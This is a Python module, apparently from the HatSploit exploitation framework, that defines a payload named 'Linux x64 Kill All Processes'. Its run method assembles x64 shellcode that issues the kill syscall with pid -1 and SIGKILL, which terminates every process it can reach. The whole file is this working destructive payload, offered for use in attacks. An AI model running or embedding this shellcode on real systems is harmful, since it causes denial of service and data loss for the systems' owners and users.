"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *
from pex.assembler import Assembler


class HatSploitPayload(Payload, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Linux x64 Kill All Processes",
            'Payload': "linux/x64/kill_all",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Kill all processes payload for Linux x64.",
            'Arch': ARCH_X64,
            'Platform': OS_LINUX,
            'Type': OneSide,
        })

    def run(self):
        return self.assemble(
            self.details['Arch'],
            """
            start:
                push 0x3e
                pop rax
                push -1
                pop rdi
                push 0x9
                pop rsi
                syscall
            """,
        )
